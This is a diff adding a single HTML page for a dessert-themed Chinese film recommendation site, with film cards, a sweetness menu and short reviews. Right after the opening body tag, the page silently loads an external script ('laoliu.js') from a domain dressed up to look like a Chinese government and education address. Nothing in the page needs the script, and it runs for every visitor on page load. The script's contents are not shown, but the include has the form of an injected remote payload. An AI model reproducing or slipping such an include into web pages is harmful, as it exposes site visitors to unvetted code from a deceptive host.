@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>草莓电影网 - 甜片菜单 · 一盒好电影</title>
+<meta name="description" content="草莓电影网，草莓甜品店风影视单页：奶油玻璃卡片、甜度评分、糖度分类、奶茶式片单。官网 https://caoliudianyingwang-h5.github.io">
+<meta name="keywords" content="草莓电影网, 甜系电影, 治愈片单, 免费电影, 在线观看">
+<meta name="author" content="草莓电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#ff4d6d">
+<style>
+:root{
+  --cream:#fff5f7;
+  --cream2:#ffeef2;
+  --card:rgba(255,255,255,.72);
+  --pink:#ff4d6d;
+  --pink-deep:#e02a52;
+  --pink-soft:#ff8fa3;
+  --seed:#3a2a2f;
+  --leaf:#5fbf7f;
+  --leaf-deep:#3f9d63;
+  --ink:#43232b;
+  --muted:#9a7b84;
+  --line:rgba(255,77,109,.28);
+  --glass-border:rgba(255,255,255,.65);
+  --shadow:0 14px 34px rgba(255,77,109,.22);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:66px}
+body{
+  background:
+    radial-gradient(460px 320px at 88% -10%,rgba(255,143,163,.55),transparent),
+    radial-gradient(420px 300px at -8% 4%,rgba(95,191,127,.22),transparent),
+    radial-gradient(300px 260px at 50% 120%,rgba(255,210,220,.6),transparent),
+    var(--cream);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",Quicksand,Nunito,system-ui,sans-serif;
+  line-height:1.78;
+}
+a{color:var(--pink-deep);text-decoration:none}
+
+/* 顶栏：奶油玻璃 */
+.bar{
+  position:sticky;top:0;z-index:50;
+  display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:12px 18px;
+  background:rgba(255,245,247,.72);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.logo b{color:var(--pink)}
+.logo span{font-size:11px;color:var(--muted);letter-spacing:3px;display:block;margin-top:-3px}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{
+  font-size:13px;padding:7px 13px;border-radius:20px;
+  background:var(--card);border:1px solid var(--glass-border);color:var(--ink);
+}
+.nav a:hover{border-color:var(--pink);color:var(--pink-deep);box-shadow:var(--shadow)}
+
+/* Hero */
+.hero{position:relative;max-width:1040px;margin:0 auto;padding:56px 20px 26px;text-align:center}
+.float-berry{position:absolute;top:8px;right:18px;font-size:54px;filter:drop-shadow(0 8px 14px rgba(255,77,109,.35));transform:rotate(8deg)}
+.float-leaf{position:absolute;top:60px;left:18px;font-size:34px;filter:drop-shadow(0 6px 10px rgba(95,191,127,.4))}
+.pill{
+  display:inline-block;font-size:12px;font-weight:800;letter-spacing:1px;
+  background:linear-gradient(90deg,var(--pink),var(--pink-soft));
+  color:#fff;padding:6px 14px;border-radius:999px;box-shadow:var(--shadow);
+}
+.hero h1{font-size:36px;margin:14px 0 8px;font-weight:900;color:var(--pink-deep)}
+.hero h1 em{font-style:normal;color:var(--leaf-deep)}
+.hero p{color:var(--muted);max-width:560px;margin:0 auto 14px;font-size:15px}
+.hero .url{
+  display:inline-block;font-family:Consolas,monospace;font-size:13px;
+  background:var(--card);border:1px dashed var(--pink);color:var(--pink-deep);
+  padding:8px 16px;border-radius:12px;
+}
+.menu-row{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+.chip-btn{
+  font-size:13px;font-weight:800;padding:9px 18px;border-radius:24px;border:0;cursor:pointer;
+}
+.chip-btn.main{background:linear-gradient(90deg,var(--pink),var(--pink-deep));color:#fff;box-shadow:var(--shadow)}
+.chip-btn.leaf{background:#eafaf0;color:var(--leaf-deep);border:1px solid rgba(95,191,127,.4)}
+
+/* 甜度条 */
+.sweet{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:22px}
+.sweet div{background:var(--card);border:1px solid var(--glass-border);border-radius:14px;padding:12px 16px;min-width:110px;box-shadow:var(--shadow)}
+.sweet b{display:block;font-size:20px;color:var(--pink-deep)}
+.sweet small{color:var(--muted);font-size:12px}
+
+/* 区块 */
+.wrap{max-width:1080px;margin:0 auto;padding:18px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:28px 0 16px}
+.sec h2{font-size:21px;color:var(--pink-deep);font-weight:900}
+.sec small{color:var(--muted);font-size:12px;letter-spacing:1px}
+.sec .tag{margin-left:auto;font-size:11px;color:#fff;background:var(--leaf);padding:3px 10px;border-radius:999px}
+
+/* 草莓盒卡片墙 */
+.box{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.film{
+  background:var(--card);backdrop-filter:blur(8px);
+  border:1px solid var(--glass-border);border-radius:22px;overflow:hidden;
+  box-shadow:var(--shadow);transition:transform .22s cubic-bezier(.34,1.56,.64,1));
+}
+.film:hover{transform:translateY(-5px) rotate(-.5deg)}
+.film .cap{
+  height:96px;display:flex;align-items:center;justify-content:center;gap:8px;
+  font-size:34px;color:#fff;position:relative;
+}
+.film .cap::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.18),transparent 40%)}
+.film:nth-child(6n+1) .cap{background:linear-gradient(135deg,#ff4d6d,#ff8fa3)}
+.film:nth-child(6n+2) .cap{background:linear-gradient(135deg,#ff7eb3,#ffd1dc)}
+.film:nth-child(6n+3) .cap{background:linear-gradient(135deg,#5fbf7f,#bfe9cb)}
+.film:nth-child(6n+4) .cap{background:linear-gradient(135deg,#ff9a76,#ffd9c2)}
+.film:nth-child(6n+5) .cap{background:linear-gradient(135deg,#c98bff,#ffe0fb)}
+.film:nth-child(6n+6) .cap{background:linear-gradient(135deg,#ff4d6d,#5fbf7f)}
+.film .body{padding:14px}
+.film h3{font-size:16px;color:var(--ink);margin-bottom:3px}
+.film p{font-size:13px;color:var(--muted);margin-bottom:8px}
+.sugar{display:flex;gap:3px;font-size:14px;color:var(--pink);margin-bottom:6px}
+.sugar span{filter:grayscale(.2)}
+.meta-tags{display:flex;gap:5px;flex-wrap:wrap}
+.t{font-size:11px;padding:2px 8px;border-radius:999px;background:var(--cream2);border:1px solid var(--line);color:var(--ink)}
+.order{margin-top:10px;display:flex;align-items:center;justify-content:space-between}
+.order b{color:var(--pink-deep);font-size:14px}
+.order a{font-size:12px;font-weight:800;padding:6px 12px;border-radius:18px;background:var(--pink);color:#fff}
+.order a:hover{background:var(--pink-deep)}
+
+/* 两栏：糖度分类 + 奶油影评 */
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:26px}
+.panel{background:var(--card);backdrop-filter:blur(8px);border:1px solid var(--glass-border);border-radius:20px;padding:18px;box-shadow:var(--shadow)}
+.panel h3{font-size:17px;color:var(--pink-deep);margin-bottom:12px}
+.sugar-list li{list-style:none;display:flex;align-items:center;gap:10px;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px}
+.sugar-list li:last-child{border-bottom:none}
+.dot{width:10px;height:10px;border-radius:50%}
+.dot.r{background:var(--pink)} .dot.p{background:var(--pink-soft)} .dot.g{background:var(--leaf)} .dot.o{background:#ff9a76} .dot.v{background:#c98bff}
+.review blockquote{font-size:14px;color:var(--ink);background:var(--cream2);border-left:4px solid var(--pink);padding:10px 12px;border-radius:0 12px 12px 0;margin-bottom:10px}
+.review small{color:var(--muted)}
+
+/* 关于 */
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:var(--cream2);border:1px solid var(--line);color:var(--pink-deep);padding:2px 7px;border-radius:8px;font-family:Consolas,monospace}
+
+.foot{text-align:center;padding:26px 20px;border-top:1px solid var(--line);color:var(--muted);font-size:12px}
+
+@media(max-width:880px){.box{grid-template-columns:repeat(2,1fr)}.cols{grid-template-columns:1fr}}
+@media(max-width:540px){.box{grid-template-columns:1fr}.hero h1{font-size:27px}.float-berry{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>草莓</b>电影网<span>STRAWBERRY FILM CAFE</span></div>
+  <nav class="nav">
+    <a href="#home">今日限定</a>
+    <a href="#box">草莓盒</a>
+    <a href="#sugar">糖度分类</a>
+    <a href="#review">奶油影评</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="float-berry">🍓</div>
+  <div class="float-leaf">🍃</div>
+  <span class="pill">今日限定 · 甜片不限量</span>
+  <h1>草莓电影网 · <em>一盒好电影，加奶油</em></h1>
+  <p>不推苦大仇深，不堆流量榜单。这里按“糖度”挑片：微酸文艺、草莓甜恋、抹茶慢片、芝士治愈、黑巧暗黑。点一盒，配爆米花，窝沙发里看。</p>
+  <div class="url">https://caoliudianyingwang-h5.github.io</div>
+  <div class="menu-row">
+    <button class="chip-btn main" onclick="document.getElementById('box').scrollIntoView()">来一盒甜片</button>
+    <a class="chip-btn leaf" href="#sugar">按糖度点单 ▾</a>
+  </div>
+  <div class="sweet">
+    <div><b>9.4</b><small>今日最甜分</small></div>
+    <div><b>6 类</b><small>糖度菜单</small></div>
+    <div><b>0 卡</b><small>广告弹窗</small></div>
+    <div><b>🍓</b><small>每片带籽</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="box">
+    <h2>🍓 草莓盒 · 本周甜片</h2><small>hand-picked</small><span class="tag">限量上架</span>
+  </div>
+  <div class="box">
+    <article class="film">
+      <div class="cap">🌷🍓</div>
+      <div class="body">
+        <h3>爱在日落黄昏时</h3>
+        <p>巴黎河边走九分钟，比九集剧都上头。微酸带甜，初恋回访。</p>
+        <div class="sugar">甜度 <span>🍬</span><span>🍬</span><span>🍬</span><span>·</span><span>·</span></div>
+        <div class="meta-tags"><span class="t">爱情</span><span class="t">长镜头</span><span class="t">欧洲</span></div>
+        <div class="order"><b>9.3 分</b><a href="#">加进盒子</a></div>
+      </div>
+    </article>
+
+    <article class="film">
+      <div class="cap">🍓🍰</div>
+      <div class="body">
+        <h3>海街日记</h3>
+        <p>梅子酒、海边火车、四姐妹做饭。像草莓大福，软乎乎不腻。</p>
+        <div class="sugar">甜度 <span>🍬</span><span>🍬</span><span>🍬</span><span>🍬</span><span>·</span></div>
+        <div class="meta-tags"><span class="t">家庭</span><span class="t">日本</span><span class="t">慢生活</span></div>
+        <div class="order"><b>9.4 分</b><a href="#">加进盒子</a></div>
+      </div>
+    </article>
+
+    <article class="film">
+      <div class="cap">🍵🍓</div>
+      <div class="body">
+        <h3>小森林</h3>
+        <p>种菜、腌菜、烤面包。抹茶级慢片，适合下雨天和失眠夜。</p>
+        <div class="sugar">甜度 <span>🍬</span><span>🍬</span><span>·</span><span>·</span><span>·</span></div>
+        <div class="meta-tags"><span class="t">治愈</span><span class="t">美食</span><span class="t">独处</span></div>
+        <div class="order"><b>9.1 分</b><a href="#">加进盒子</a></div>
+      </div>
+    </article>
+
+    <article class="film">
+      <div class="cap">🍫🍓</div>
+      <div class="body">
+        <h3>看不见的客人</h3>
+        <p>黑巧味悬疑，苦到尾。每一层反转都像咬到可可碎。</p>
+        <div class="sugar">甜度 <span>·</span><span>·</span><span>·</span><span>🍬</span><span>🍬</span></div>
+        <div class="meta-tags"><span class="t">悬疑</span><span class="t">西班牙</span><span class="t">反转</span></div>
+        <div class="order"><b>9.0 分</b><a href="#">加进盒子</a></div>
+      </div>
+    </article>
+
+    <article class="film">
+      <div class="cap">🧀🍓</div>
+      <div class="body">
+        <h3>帕丁顿熊2</h3>
+        <p>芝士级治愈，连监狱犯人都被它哄好。全家桶甜片。</p>
+        <div class="sugar">甜度 <span>🍬</span><span>🍬</span><span>🍬</span><span>🍬</span><span>🍬</span></div>
+        <div class="meta-tags"><span class="t">喜剧</span><span class="t">家庭</span><span class="t">英伦</span></div>
+        <div class="order"><b>9.2 分</b><a href="#">加进盒子</a></div>
+      </div>
+    </article>
+
+    <article class="film">
+      <div class="cap">🌹🍓</div>
+      <div class="body">
+        <h3>燃烧</h3>
+        <p>酸甜里藏火。看完像含了颗酒心草莓，后劲很大。</p>
+        <div class="sugar">甜度 <span>🍬</span><span>·</span><span>·</span><span>🍬</span><span>·</span></div>
+        <div class="meta-tags"><span class="t">文艺</span><span class="t">悬疑</span><span class="t">韩影</span></div>
+        <div class="order"><b>8.9 分</b><a href="#">加进盒子</a></div>
+      </div>
+    </article>
+  </div>
+
+  <div class="cols">
+    <section class="panel" id="sugar">
+      <h3>🍬 糖度菜单</h3>
+      <ul class="sugar-list">
+        <li><span class="dot r"></span> 草莓甜恋 — 爱情 / 初恋 / 婚礼 / 情书</li>
+        <li><span class="dot p"></span> 蜜桃软糖 — 青春 / 闺蜜 / 校园 / 夏天</li>
+        <li><span class="dot g"></span> 抹茶慢片 — 治愈 / 美食 / 独处 / 四季</li>
+        <li><span class="dot o"></span> 芝士治愈 — 家庭 / 动物 / 全家桶 / 不伤心</li>
+        <li><span class="dot v"></span> 蓝莓梦境 — 奇幻 / 动画 / 深夜脑洞</li>
+        <li><span class="dot r"></span> 黑巧暗黑 — 悬疑 / 犯罪 / 苦尾反转</li>
+      </ul>
+    </section>
+
+    <section class="panel review" id="review">
+      <h3>🍰 奶油影评</h3>
+      <blockquote>“看《海街日记》像咬开草莓大福：不惊艳，但停不下来，最后舌头上全是温柔。”<br><small>— 店员小莓</small></blockquote>
+      <blockquote>“悬疑片别都当黑巧。《燃烧》是酒心草莓，甜的那口是假的，烧起来才真。”<br><small>— 常客阿布</small></blockquote>
+      <blockquote>“失眠别刷短视频，点一盒《小森林》，听切黄瓜的声音比白噪音管用。”<br><small>— 夜班观众</small></blockquote>
+    </section>
+  </div>
+
+  <section class="panel about" id="about" style="margin-top:26px">
+    <h3>🍓 关于草莓电影网</h3>
+    <p><strong>草莓电影网</strong> 是“草莓甜品店 / 奶油玻璃”风影视展示单页：片单像甜品菜单，卡片像草莓盒，挑片按糖度，不卷热度、不弹办卡。</p>
+    <p>官网：<code>https://caoliudianyingwang-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>本店只荐片、不存片、不解析、不冒充播放源。看完请擦嘴。</p>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 草莓电影网 · caoliudianyingwang-h5.github.io · 一盒好电影，加奶油 🍓
+</footer>
+
+</body>
+</html>
